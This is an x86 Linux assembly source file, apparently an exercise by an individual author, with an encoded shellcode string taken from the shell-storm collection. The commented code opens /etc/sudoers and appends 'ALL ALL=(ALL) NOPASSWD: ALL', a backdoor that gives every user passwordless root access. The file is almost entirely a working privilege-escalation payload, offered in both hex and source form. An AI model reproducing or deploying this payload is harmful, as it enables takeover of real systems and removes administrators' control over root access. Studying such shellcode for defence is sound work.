; Filename: sudoers.nasm
; Author:   Jake
; Website:  http://github.com/14deep
; Purpose:  sudoers shellcode from shell-storm
;	    www.shell-storm.org/shellcode/files/shellcode-62.php
; Shellcode: "\x31\xd2\xf7\xe2\x52\xbb\x6f\x65\x72\x73\x53\xbb\x2f\x73\x75\x64\x53\xbb\x2f\x65\x74\x63\x53\x89\xe3\x66\xb9\x01\x04\x04\x05\xcd\x80\x93\xf7\xe2\x52\x68\x41\x4c\x4c\x0a\x68\x57\x44\x3a\x20\x68\x50\x41\x53\x53\x68\x29\x20\x4e\x4f\x68\x28\x41\x4c\x4c\x68\x41\x4c\x4c\x3d\x68\x41\x4c\x4c\x20\x89\xe1\x80\xc2\x1c\x04\x04\xcd\x80\xb0\x06\xcd\x80\x31\xdb\xf7\xe3\x40\xcd\x80"


global _start			

section .text
_start:


;open("/etc/sudoers", O_WRONLY | O_APPEND);
	xor edx, edx
	mul edx
	push edx
	
	mov ebx, 0x7372656f 
	push ebx
	mov ebx, 0x6475732f
	push ebx
	mov ebx, 0x6374652f
	push ebx
	mov ebx, esp
	mov cx, 0x401
	add al, 0x05
	int 0x80

	xchg ebx, eax  

	;write(fd, ALL ALL=(ALL) NOPASSWD: ALL\n, len);
	mul edx
	push edx
	push 0x0a4c4c41
	push 0x203a4457
	push 0x53534150
	push 0x4f4e2029
	push 0x4c4c4128
	push 0x3d4c4c41
	push 0x204c4c41
	mov ecx, esp
	add dl, 0x1c
	add al, 0x04
	int 0x80

	;close(file)
	mov al, 0x06
	int 0x80

	;exit(0);
	xor ebx, ebx
	mul ebx
	inc eax
	int 0x80
